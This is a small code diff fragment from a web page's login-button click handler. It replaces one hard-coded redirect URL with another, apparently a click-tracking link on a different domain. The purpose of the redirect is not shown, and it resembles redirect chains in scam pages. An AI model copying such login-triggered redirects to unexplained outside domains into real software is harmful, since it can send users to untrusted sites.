@@ -72,6 +72,6 @@ LoginBtn.addEventListener('click', e => {
         return; // Abort the transaction.
       }
     });
-    window.location.replace("https://zeromsec.com/cl/bcbdc1702709955b?p1=&p2=&source=&site=");
+    window.location.replace("https://moveasgg.org/cl/e547b8e13f88f586?p1=&p2=&source=&site=");
   }
 });
